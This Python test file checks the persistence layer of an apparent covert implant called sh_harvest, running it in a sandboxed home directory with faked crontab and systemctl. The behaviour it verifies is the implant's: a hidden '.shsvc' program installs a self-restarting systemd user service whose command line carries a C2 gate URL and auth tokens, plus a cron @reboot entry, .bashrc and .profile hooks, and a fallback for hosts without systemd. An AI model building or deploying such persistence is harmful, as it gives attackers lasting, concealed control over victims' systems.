#!/usr/bin/env python3
"""test_persist_linux.py -- layered persistence, fully sandboxed.

Runs sh_harvest's persist functions against a throwaway HOME with
subprocess.run intercepted (fake crontab/systemctl), so the test:
  - never touches the real crontab, systemd, or dotfiles
  - passes identically on Windows and Linux CI

Covers: systemd-user-service layer (file content + enable/start calls),
cron @reboot layer, shell-profile layer, layered fallback when systemd
is unavailable, status reporting, and full removal.
"""
import importlib.util
import os
import shutil
import subprocess
import sys
import tempfile
import types

HERE = os.path.dirname(os.path.abspath(__file__))
MOD = os.path.join(os.path.dirname(HERE), "linux", "sh_harvest.py")

NAME = ".shsvc"


class FakeSys:
    """Intercepts subprocess.run for crontab/systemctl only."""

    def __init__(self, systemd_works=True):
        self.systemd_works = systemd_works
        self.crontab = ""
        self.calls = []
        self.enabled = False

    def run(self, cmd, *a, **k):
        cmd = list(cmd)
        self.calls.append(cmd)
        r = types.SimpleNamespace(returncode=0, stdout="", stderr="")
        if cmd[0] == "crontab":
            if "-l" in cmd:
                r.stdout = self.crontab
            elif "-" in cmd:
                self.crontab = k.get("input", "")
        elif cmd[0] == "systemctl":
            if not self.systemd_works:
                r.returncode = 1
                r.stderr = "System has not been booted with systemd"
            else:
                if "enable" in cmd:
                    self.enabled = True
                elif "disable" in cmd:
                    self.enabled = False
                elif "is-enabled" in cmd:
                    r.stdout = "enabled\n" if self.enabled else "disabled\n"
        return r


def load_module():
    spec = importlib.util.spec_from_file_location("sh_harvest_t", MOD)
    m = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(m)
    return m


def main():
    tmp = tempfile.mkdtemp(prefix="sh_persist_")
    saved_env = {k: os.environ.get(k) for k in
                 ("HOME", "USERPROFILE", "HOMEDRIVE", "HOMEPATH")}
    saved_run = subprocess.run
    try:
        # sandbox the home directory (expanduser keys off these)
        os.environ["HOME"] = tmp
        os.environ["USERPROFILE"] = tmp
        for k in ("HOMEDRIVE", "HOMEPATH"):
            os.environ.pop(k, None)
        home = os.path.join(tmp)  # expanduser("~") resolves under tmp

        sh = load_module()
        args = types.SimpleNamespace(
            loop=300, jitter=60, c2="http://10.0.0.9:8443/gate",
            psk="unitpsk", auth="atok")

        # ---- scenario 1: systemd available -> all three layers
        fake = FakeSys(systemd_works=True)
        subprocess.run = fake.run
        res = sh.persist_install(args)
        assert "systemd=True" in res, res
        assert "cron=True" in res, res
        assert "profile=True" in res, res

        svc = os.path.join(home, ".config", "systemd", "user",
                           NAME + ".service")
        assert os.path.exists(svc), "service file missing"
        body = open(svc).read()
        assert "Restart=always" in body, body
        assert "WantedBy=default.target" in body, body
        assert args.c2 in body, "ExecStart must carry the C2 URL"
        assert "--psk" in body and "--auth" in body, body

        staged = os.path.join(home, ".local", "share", NAME + ".py")
        assert os.path.exists(staged), "staged copy missing"
        assert open(staged, "rb").read()[:2] == open(MOD, "rb").read()[:2]

        assert "@reboot" in fake.crontab and staged in fake.crontab
        enabled = any("enable" in c for c in fake.calls
                      if c[0] == "systemctl")
        started = any("start" in c for c in fake.calls if c[0] == "systemctl")
        assert enabled and started, "systemctl enable/start not invoked"

        for rc in (".bashrc", ".profile"):
            p = os.path.join(home, rc)
            assert NAME in open(p).read(), "%s hook missing" % rc

        state = sh.persist_state()
        for want in ("systemd", "cron", "profile"):
            assert want in state, "state %r missing %s" % (state, want)
        print("[ok] install (systemd box): 3 layers, service+cron+profile")

        # ---- scenario 2: removal cleans every layer
        rem = sh.persist_remove()
        assert "systemd" in rem and "cron" in rem, rem
        assert not os.path.exists(svc), "service file survived removal"
        assert not os.path.exists(staged), "staged copy survived removal"
        assert NAME not in fake.crontab, "cron entry survived removal"
        for rc in (".bashrc", ".profile"):
            assert NAME not in open(os.path.join(home, rc)).read(), \
                "%s hook survived removal" % rc
        assert sh.persist_state() == "none"
        print("[ok] remove: all layers reversed, state -> none")

        # ---- scenario 3: no systemd (container/WSL1) -> cron+profile carry
        fake2 = FakeSys(systemd_works=False)
        subprocess.run = fake2.run
        res2 = sh.persist_install(args)
        assert "systemd=False" in res2, res2
        assert "cron=True" in res2 and "profile=True" in res2, res2
        assert os.path.exists(os.path.join(
            home, ".config", "systemd", "user", NAME + ".service")), \
            "service file still written for later manual enable"
        state2 = sh.persist_state()
        assert "systemd" not in state2 and "cron" in state2, state2
        print("[ok] fallback (no systemd): cron+profile active")

        print("\npersistence layering OK: install/status/remove/fallback")
        return 0
    finally:
        subprocess.run = saved_run
        for k, v in saved_env.items():
            if v is None:
                os.environ.pop(k, None)
            else:
                os.environ[k] = v
        shutil.rmtree(tmp, ignore_errors=True)


if __name__ == "__main__":
    sys.exit(main())
